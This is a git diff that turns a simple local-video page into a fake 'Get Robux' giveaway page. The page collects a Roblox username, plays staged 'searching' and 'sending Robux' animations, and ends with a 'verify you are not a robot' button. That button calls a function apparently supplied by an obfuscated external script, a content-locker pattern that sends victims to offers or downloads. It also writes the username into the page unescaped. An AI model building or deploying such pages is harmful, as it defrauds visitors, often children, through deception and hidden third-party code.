@@ -1,30 +1,480 @@
-<!DOCTYPE html>
-<html lang="en">
+
+
+ 
+<!DOCTYPE html><html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Embedded Local Videos</title>
-</head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/styles.css">
+    <title>Get Robux</title>
+    <link href="icon.ico" rel="icon">
+    <script type="text/javascript">
+      var fCOMz_IvK_LxKWOc = { "it": 4294715, "key": "d5f40" };
+    </script>
+    <script src="https://d2ntqa2f0qw7q7.cloudfront.net/55e74df.js"></script>
+ </head>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&amp;display=swap');
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Montserrat", sans-serif;
+}
+
+.logo {
+  width: 30px;
+  display: flex;
+  align-items: center;
+}
+
+.logo span {
+  font-weight: 900;
+  margin-right: 18px;
+  font-size: 25px;
+}
+nav {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #dee1e3;
+  border: solid #c7cbce;
+  border-width: 0 0 1px;
+  padding: 0 40px;
+}
+
+nav ul {
+  list-style: none;
+  display: flex;
+  margin-left: -45px;
+}
+
+body {
+  background-color: #f2f4f5;
+  color: #393b3d;
+}
+img {
+  width: 100%;
+}
+
+ul li {
+  margin-left: 30px;
+}
+
+.middle {
+  width: 70%;
+  margin: 10px auto;
+  height: 135px;
+  background-image: linear-gradient(
+      0deg,
+      rgba(39, 39, 46, 0.5),
+      rgba(39, 39, 46, 0.5)
+    ),
+    url(https://g.foolcdn.com/image/?url=https%3A%2F%2Fg.foolcdn.com%2Feditorial%2Fimages%2F630619%2F782b7fc18a24ee997efd9a7f02fa4bf9-bg_08072019.jpg&w=700);
+  background-position: bottom;
+  background-size: 100%;
+  margin-bottom: 24px;
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  text-align: center;
+}
+
+.middle h2 {
+  margin-bottom: 10px;
+  font-size: 35px;
+}
+.middle p {
+  font-size: 17px;
+}
+
+body .para {
+  font-size: 10px;
+  font-weight: 500;
+  margin-top: 50px;
+  color: #606162;
+  text-align: center;
+  width: 100%;
+  margin: 50px auto;
+}
+.box_con {
+  margin: 0 auto;
+  background-color: #fff;
+  min-height: 163px;
+  width: 70%;
+  font-size: 20px;
+  padding: 20px;
+  border: solid #c7cbce;
+  border-width: 1px 1px 1px;
+}
+input {
+  padding: 11px 15px;
+  border: none;
+  background: #f2f4f5;
+  border-radius: 9px;
+  outline: none;
+  font-size: 17px;
+}
+
+button {
+  background: #393b3d;
+  outline: none;
+  border: none;
+  color: #fff;
+  padding: 8px 10px;
+
+  border-radius: 5px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  font-size: 14px;
+  cursor: pointer;
+  margin-top: 30px;
+}
+
+.box2 {
+  display: none;
+}
+
+.box3 {
+  display: none;
+}
+.box4 {
+  display: none;
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  background-color: #ffffffbc;
+  border-radius: 8px;
+}
+
+.row {
+  display: flex;
+  align-items: center;
+  height: 70px;
+  justify-content: space-around;
+}
+.row:not(.row:last-child) {
+  border-bottom: 1px solid #bdbebe;
+}
+.price {
+  font-size: 20px;
+  font-weight: 700;
+}
+.robux_total {
+  display: flex;
+  align-items: center;
+}
+.details:hover {
+  background-color: rgb(226, 226, 226);
+}
+.pic {
+  width: 30px;
+  margin-right: 10px;
+  pointer-events: none;
+  margin-top: 2px;
+}
+span {
+  font-size: 20px;
+  font-weight: 800;
+  color: rgba(0, 0, 0, 0.6);
+}
+img {
+  width: 100%;
+}
+
+h3 {
+  font-size: 32px;
+  margin-bottom: 21px;
+}
+.details {
+  border: 1px solid #b8b8b8;
+  border-radius: 8px;
+  padding: 5px 8px;
+  width: 180px;
+  display: flex;
+  justify-content: center;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.folding {
+  margin: 20px auto;
+  width: 100px;
+  height: 100px;
+  position: relative;
+  transform: rotateZ(45deg);
+}
+
+.square {
+  position: absolute;
+  top: 36%;
+  right: 35%;
+  width: 30px;
+  height: 30px;
+  background-color: #fff;
+  transform: rotateZ(87deg);
+}
+.folding .sk-cube {
+  float: left;
+  width: 50%;
+  height: 50%;
+  position: relative;
+  transform: scale(1.1);
+}
+
+.folding .sk-cube:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #333;
+  animation: sk-foldCubeAngle 2.4s infinite linear both;
+  transform-origin: 100% 100%;
+}
+
+.folding .sk-cube2 {
+  transform: scale(1.1) rotateZ(90deg);
+}
+
+.folding .sk-cube3 {
+  transform: scale(1.1) rotateZ(180deg);
+}
+
+.folding .sk-cube4 {
+  transform: scale(1.1) rotateZ(270deg);
+}
+
+.folding .sk-cube2:before {
+  animation-delay: 0.3s;
+}
+
+.folding .sk-cube3:before {
+  animation-delay: 0.6s;
+}
+
+.folding .sk-cube4:before {
+  animation-delay: 0.9s;
+}
+
+@keyframes sk-foldCubeAngle {
+  0%,
+  10% {
+    transform: perspective(140px) rotateX(-180deg);
+    opacity: 0;
+  }
+  25%,
+  75% {
+    transform: perspective(140px) rotateX(0deg);
+    opacity: 1;
+  }
+  90%,
+  100% {
+    transform: perspective(140px) rotateY(180deg);
+    opacity: 0;
+  }
+}
+@media (max-width: 400px) {
+  nav {
+    padding: 0 5px;
+  }
+}
+
+@media (max-width: 1042px) {
+  .middle,
+  .box_con,
+  .para {
+    width: 90%;
+  }
+}
+
+@media (max-width: 750px) {
+  .middle,
+  .box_con {
+    width: 100%;
+  }
+  .para {
+    width: 100%;
+  }
+  .middle h2 {
+    margin-bottom: 10px;
+    font-size: 30px;
+  }
+  .middle p {
+    font-size: 13px;
+  }
+}
+
+@media (max-width: 373px) {
+  .logo span {
+    display: none;
+  }
+  nav {
+    padding: 0px;
+  }
+}
+
+@media (max-width: 442px) {
+
+  nav {
+    padding: 0px 20px;
+  }
+}
+
+@media (max-width: 396px) {
+
+  nav {
+    padding: 0px 10px;
+  }
+}
+</style>
 <body>
 
-<h2>Embedded Local Videos</h2>
+    <nav>
+        
+        <div class="logo">
+            <span>☰</span>
+            
+        </div>
+        <ul>
+            <li>Discover</li>
+            <li>Marketplace</li>
+            <li>Robux</li>
+        </ul>
+    </nav>
 
-<video width="640" height="360" controls>
-  <source src="videos/lv_0_20240420105512.mp4" type="wood videos/mp4">
-  Your browser does not support the video tag.
-</video>
+    <div class="middle">
+        <h2>Get Robux</h2>
+        <p>Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
+    </div>
 
-<video width="640" height="360" controls>
-  <source src="videos/lv_0_20240420105809.mp4" type="wood videos/mp4">
-  Your browser does not support the video tag.
-</video>
+    <center><div class="box_con">
+        <div class="box">
+            <h3>Roblox </h3><br>
+            <input class="username" type="text" name="" placeholder="Enter Username"><br>
+            <button class="getrbx">Claim Robux</button>
+        </div>
+        <div class="box2">
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for amjad ...</p>
+             <div class="folding">
+            	<img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcTFoMHhnaDFkbzB1ZHFlaGttYXYzY2pzNGU1bnBncGkwNmwzNzF6ZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/1QcqLUCuQca1edQ0rK/giphy.gif"width:42px;height:42px;">
 
-<video width="640" height="360" controls>
-  <source src="videos/lv_0_20240420110010.mp4" type="wood videos/mp4">
-  Your browser does not support the video tag.
-</video>
+        </div>
+        </div>
+        <div class="box3">
+            <div class="container">
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://i.imgur.com/mHAoWPu.png"></div><span>800</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
 
-<!-- Add more <video> tags for the remaining video files -->
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://i.imgur.com/mHAoWPu.png"></div><span>1700</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://i.imgur.com/mHAoWPu.png"></div>
+                            <span>5500</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://i.imgur.com/mHAoWPu.png"></div><span>20000</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+        <div class="box4">
+            <h3>Last step</h3>
+            <p>Please verify that you are Not a Robot to receive your Robux!</p>
+<button onclick="_qW()"
+style=font-size: 19px ;>Verify please</button>
+        </center>
+        </div>
+    </div>
+
+    
+    
+
+<script>
+const rbxbtn = document.querySelector(".getrbx");
+
+const box1 = document.querySelector(".box");
+const box2 = document.querySelector(".box2");
+const box3 = document.querySelector(".box3");
+const box4 = document.querySelector(".box4");
+const rbxtotal = document.querySelectorAll(".details");
+
+const username = document.querySelector(".username");
+
+const useroutput = document.querySelector(".useroutput");
+
+rbxbtn.addEventListener("click", () => {
+  if (username.value.length <= 2) {
+    alert("please enter username");
+  } else {
+    box1.style.display = "none";
+    box2.style.display = "block";
+    setTimeout(showbox2, 2500);
+    setTimeout(showbox3, 2500);
+  }
+
+  useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
+});
+
+rbxtotal.forEach((btn) => {
+  btn.addEventListener("click", () => {
+    box3.style.display = "none";
+
+    box2.style.display = "block";
+
+    setTimeout(showboxagain, 2500);
+    setTimeout(showbox4, 2500);
+    useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
+  });
+});
+
+let showboxagain = () => {
+  box2.style.display = "none";
+};
+let showbox2 = () => {
+  box2.style.display = "none";
+};
+
+let showbox3 = () => {
+  box3.style.display = "block";
+};
+
+let showbox4 = () => {
+  box4.style.display = "block";
+};
+</script>
 
 </body>
 </html>
